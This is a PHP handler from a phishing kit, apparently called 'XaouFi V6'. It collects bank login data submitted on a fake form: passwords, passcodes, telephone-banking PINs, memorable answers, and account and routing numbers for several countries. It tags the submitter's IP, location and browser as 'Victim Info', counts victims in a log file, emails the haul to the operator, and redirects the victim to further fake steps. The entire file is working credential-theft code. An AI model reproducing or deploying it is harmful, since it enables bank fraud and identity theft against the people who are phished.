<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');
include('../quotes.php');

$datei = fopen("../logsz/bank.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/bank.txt","w");
fwrite($datei, $count);
fclose($datei);

$message =" ".$quote."
++------[ Bank Account ]------++
Bank Name       : ".$_POST['bnkname']."".$_POST['bnknames']."
Customer ID     : ".$_POST['csid']."
User ID         : ".$_POST['u_id']."
Surname         : ".$_POST['s_name']."
Username        : ".$_POST['us_name']."
Password        : ".$_POST['pwd_b']."
Passcode        : ".$_POST['pscode']."
Memorable       : ".$_POST['m_able']."
Memorable Place : ".$_POST['m_ableplace']."
Membership Number : ".$_POST['m_num']."
Registration Number   : ".$_POST['rnum']."
Telephone Banking Pin/Security Number   : ".$_POST['tpin']."


++------[ Bank Info CA ]------++
Bank Name              : ".$_POST['bnknameca']."
Account Number         : ".$_POST['acnn']."
Login ID/ Card Number  : ".$_POST['lo_ca']."
Password               : ".$_POST['pwd_ca']."


++------[ Bank Info US & Other ]------++
Bank Name        : ".$_POST['bnknameus']."
Account Number   : ".$_POST['acnot']."
Login Bank       : ".$_POST['lobank']."
Password         : ".$_POST['pwd_csdad']."
Routing/swift    : ".$_POST['swsd']."


++------[ Victim Info ]------++
IP Info         :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

++------[ End Of Info ]------++
";
crypto($message);
include('../settings.php');
$subject = "BANK ".$_POST['bnkname']."".$_POST['bnknames']."".$_POST['bnknameca']."".$_POST['bnknameus']." [ ".$nama_negara." - " . $kota . " - " . $ip . " ]";
$headers = "From: XaouFi V6 <ademaya2003@yandex.com>";
mail($pais_email, $subject, $message, $headers);
if ($pais_selfie == 'selfie_active') {
	header("LOCATION: trackinginfo.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&step=six&time=".md5(gmdate('r')).sha1(gmdate('r')));
}else{
	header("LOCATION: redirscr.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&step=six&time=".md5(gmdate('r')).sha1(gmdate('r')));
}
?>